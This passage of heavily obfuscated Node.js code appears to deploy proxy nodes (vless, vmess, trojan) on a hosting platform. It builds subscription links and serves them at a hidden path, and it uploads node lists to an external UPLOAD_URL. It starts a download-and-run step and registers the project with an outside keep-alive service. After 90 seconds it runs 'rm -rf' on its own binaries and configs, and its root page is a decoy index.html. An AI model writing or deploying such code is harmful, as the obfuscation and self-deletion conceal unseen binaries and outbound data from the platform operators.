_0x544893={_0x3a7acb:0x159,_0xcd142d:0x119,_0x1fa545:0xf9,_0x37366f:0x175,_0x38fd4d:0x15f,_0x1cb1c1:0xfc,_0x31a341:0x135,_0x483215:0x150,_0x48904b:0x157,_0x52e528:0xf9,_0x13766a:0xed,_0x2a98c3:0x137,_0x3bb005:0x179},_0x215063=await _0x9e89a2(),_0x1c54f3=NAME?NAME+'-'+_0x215063:_0x215063;return new Promise(_0x1979e8=>{const _0x1ea789={_0x1bfb9e:0x195,_0x39c178:0x168};setTimeout(()=>{const _0x3fcfb0=_0x16f9,_0x401121={'v':'2','ps':''+_0x1c54f3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3fcfb0(0x17e),'net':'ws','type':_0x3fcfb0(0x16b),'host':_0x21ef7c,'path':_0x3fcfb0(_0x544893._0x3a7acb),'tls':_0x3fcfb0(0x12d),'sni':_0x21ef7c,'alpn':'','fp':_0x3fcfb0(_0x544893._0xcd142d)},_0x145cbb=_0x3fcfb0(0x176)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x21ef7c+_0x3fcfb0(_0x544893._0x1fa545)+_0x21ef7c+_0x3fcfb0(_0x544893._0x37366f)+_0x1c54f3+_0x3fcfb0(_0x544893._0x38fd4d)+Buffer[_0x3fcfb0(_0x544893._0x1cb1c1)](JSON[_0x3fcfb0(0x139)](_0x401121))[_0x3fcfb0(0x11f)](_0x3fcfb0(_0x544893._0x31a341))+_0x3fcfb0(_0x544893._0x483215)+UUID+'@'+CFIP+':'+CFPORT+_0x3fcfb0(_0x544893._0x48904b)+_0x21ef7c+_0x3fcfb0(_0x544893._0x52e528)+_0x21ef7c+_0x3fcfb0(_0x544893._0x13766a)+_0x1c54f3+_0x3fcfb0(0x118);console[_0x3fcfb0(0x16f)](Buffer[_0x3fcfb0(_0x544893._0x1cb1c1)](_0x145cbb)[_0x3fcfb0(0x11f)](_0x3fcfb0(0x135))),fs[_0x3fcfb0(0x155)](subPath,Buffer['from'](_0x145cbb)['toString'](_0x3fcfb0(_0x544893._0x31a341))),console['log'](FILE_PATH+_0x3fcfb0(_0x544893._0x2a98c3)),uploadNodes(),app[_0x3fcfb0(_0x544893._0x3bb005)]('/'+SUB_PATH,(_0x452570,_0x3454a2)=>{const _0x438ae8=_0x3fcfb0,_0x2ef05a=Buffer['from'](_0x145cbb)[_0x438ae8(0x11f)](_0x438ae8(0x135));_0x3454a2['set'](_0x438ae8(_0x1ea789._0x1bfb9e),_0x438ae8(0x186)),_0x3454a2[_0x438ae8(_0x1ea789._0x39c178)](_0x2ef05a);}),_0x1979e8(_0x145cbb);},0x7d0);});}}async function uploadNodes(){const _0x263a9f={_0x4d9453:0x17c,_0xb51cdb:0x163,_0x317b7a:0x110,_0x46431a:0x16f,_0x438b77:0x130,_0x4b3066:0xf7,_0x5650f3:0x178,_0x19ee19:0x106,_0x2fe1e4:0x17f,_0x32f70a:0x16f},_0x11ff9d=_0x1caaf0;if(UPLOAD_URL&&PROJECT_URL){const _0x3a2562=PROJECT_URL+'/'+SUB_PATH,_0x4551c1={'subscription':[_0x3a2562]};try{const _0x1697ce=await axios[_0x11ff9d(_0x263a9f._0x4d9453)](UPLOAD_URL+_0x11ff9d(_0x263a9f._0xb51cdb),_0x4551c1,{'headers':{'Content-Type':_0x11ff9d(0x18c)}});return _0x1697ce&&_0x1697ce[_0x11ff9d(_0x263a9f._0x317b7a)]===0xc8?(console[_0x11ff9d(_0x263a9f._0x46431a)](_0x11ff9d(_0x263a9f._0x438b77)),_0x1697ce):null;}catch(_0x211f08){if(_0x211f08['response']){if(_0x211f08[_0x11ff9d(0xf5)][_0x11ff9d(0x110)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x11ff9d(0x170)](listPath))return;const _0x43f33a=fs[_0x11ff9d(_0x263a9f._0x4b3066)](listPath,_0x11ff9d(_0x263a9f._0x5650f3)),_0x338f15=_0x43f33a[_0x11ff9d(0x142)]('\x0a')[_0x11ff9d(_0x263a9f._0x19ee19)](_0x469e7f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x11ff9d(0x181)](_0x469e7f));if(_0x338f15[_0x11ff9d(_0x263a9f._0x2fe1e4)]===0x0)return;const _0x1a933b=JSON[_0x11ff9d(0x139)]({'nodes':_0x338f15});try{const _0xffc5df=await axios['post'](UPLOAD_URL+_0x11ff9d(0x13d),_0x1a933b,{'headers':{'Content-Type':_0x11ff9d(0x18c)}});return _0xffc5df&&_0xffc5df[_0x11ff9d(0x110)]===0xc8?(console[_0x11ff9d(_0x263a9f._0x32f70a)]('Nodes\x20uploaded\x20successfully'),_0xffc5df):null;}catch(_0x178c46){return null;}}else return;}}function cleanFiles(){const _0x55edd7={_0x181f8e:0xe2,_0x4b9e5f:0x161,_0x3ac5e1:0x18b,_0xeee321:0xfa,_0x5cad5a:0xef},_0xb9d8d5={_0x5bbc87:0x16f,_0x27644b:0x15b},_0x37a594={_0x32be5d:0x146,_0x1e8d1c:0x15b};setTimeout(()=>{const _0x402d71=_0x16f9,_0x514958=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x514958[_0x402d71(0x133)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x514958['push'](phpPath);process[_0x402d71(_0x55edd7._0x181f8e)]===_0x402d71(_0x55edd7._0x4b9e5f)?exec(_0x402d71(_0x55edd7._0x3ac5e1)+_0x514958[_0x402d71(_0x55edd7._0xeee321)]('\x20')+_0x402d71(0xf8),_0x4aa98f=>{const _0x20fa32=_0x402d71;console[_0x20fa32(_0x37a594._0x32be5d)](),console['log'](_0x20fa32(_0x37a594._0x1e8d1c)),console['log'](_0x20fa32(0x160));}):exec('rm\x20-rf\x20'+_0x514958[_0x402d71(0xfa)]('\x20')+_0x402d71(_0x55edd7._0x5cad5a),_0x1fbbf0=>{const _0x402b73=_0x402d71;console[_0x402b73(0x146)](),console[_0x402b73(_0xb9d8d5._0x5bbc87)](_0x402b73(_0xb9d8d5._0x27644b)),console['log'](_0x402b73(0x160));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xfd9cb1={_0x37f51d:0x16f,_0x592953:0x17c,_0x55b525:0x121},_0x133413=_0x1caaf0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x133413(_0xfd9cb1._0x37f51d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5c1f31=await axios[_0x133413(_0xfd9cb1._0x592953)](_0x133413(0x187),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x133413(0x18c)}});return console[_0x133413(_0xfd9cb1._0x37f51d)](_0x133413(0x112)),_0x5c1f31;}catch(_0x3e3a5e){return console[_0x133413(_0xfd9cb1._0x55b525)](_0x133413(0x12b)+_0x3e3a5e['message']),null;}}async function startserver(){try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xc6f4eb){console['error']('Error\x20in\x20startserver:',_0xc6f4eb);}}startserver()[_0x1caaf0(0xe7)](_0x23ea64=>{const _0x14902e=_0x1caaf0;console[_0x14902e(0x121)](_0x14902e(0x13e),_0x23ea64);}),app[_0x1caaf0(0x179)]('/',async function(_0x49c3a1,_0x60990f){const _0x8765f2={_0xd53f8:0x113,_0x334d76:0x193,_0x5aa04f:0x153},_0x401908=_0x1caaf0;try{const _0x556fd7=path[_0x401908(0xfa)](__dirname,_0x401908(_0x8765f2._0xd53f8)),_0x2f43a5=await fs[_0x401908(_0x8765f2._0x334d76)][_0x401908(_0x8765f2._0x5aa04f)](_0x556fd7,_0x401908(0x184));_0x60990f['send'](_0x2f43a5);}catch(_0x1db80b){_0x60990f['send'](_0x401908(0x15c));}}),app[_0x1caaf0(0x124)](PORT,()=>console[_0x1caaf0(0x16f)](_0x1caaf0(0xe4)+PORT+'!'));
